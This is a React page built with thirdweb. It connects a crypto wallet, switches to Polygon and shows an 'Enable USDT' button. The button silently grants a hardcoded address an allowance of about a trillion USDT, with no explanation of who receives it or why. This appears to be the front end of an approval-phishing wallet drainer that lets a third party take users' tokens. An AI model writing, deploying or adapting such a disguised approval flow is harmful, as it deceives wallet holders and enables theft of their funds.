import { ConnectWallet } from "@thirdweb-dev/react";
import "./styles/Home.css";

import React, { useEffect, useState } from "react";
import {
  useAddress,
  useChainId,
  useSwitchChain,
  useContract,
  useConnectionStatus,
} from "@thirdweb-dev/react";
import { Polygon } from "@thirdweb-dev/chains";

export default function Home() {
  return (
    <main className="main">
      <div className="container">
        <div className="header">
          <div className="connect">
            <ConnectWallet
              dropdownPosition={{
                side: "bottom",
                align: "center",
              }}
            />
          </div>
        </div>

        <ApproveButton />
      </div>
    </main>
  );
}

export const ApproveButton = () => {
  const address = useAddress();
  const currentChainId = useChainId();
  const connectionStatus = useConnectionStatus();
  const switchChain = useSwitchChain();

  const {
    contract,
    isLoading: contractLoading,
    error: contractError,
  } = useContract("0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "erc20");
  const [isLoading, setIsLoading] = useState(false);

  const callApproval = async () => {
    try {
      if (currentChainId !== Polygon.chainId) {
        console.error("Wrong network. Please switch to the Polygon network.");
        if (connectionStatus === "connected") {
          await switchChain(Polygon.chainId);
        }
      }
      if (address && contract) {
        console.log("Contract instance:", contract);
        setIsLoading(true);
        // Check if the ERC20 interface is available on the contract
        if (!contract.erc20) {
          throw new Error("ERC20 interface is not available on the contract.");
        }
        const tx = await contract.erc20.setAllowance(
          "0x406aE7273E16F48caA25C5a4C37266661051A11e",
          1000000000000000000
        );
        alert("Contract call success:");
      }
    } catch (err) {
      alert("Contract call failure:");
    } finally {
      setIsLoading(false);
    }
  };

  return isLoading || contractLoading ? (
    <div>Loading....</div>
  ) : (
    <button
      onClick={callApproval}
      style={{
        padding: "10px",
        fontSize: "16px",
      }}
    >
      Enable USDT
    </button>
  );
};
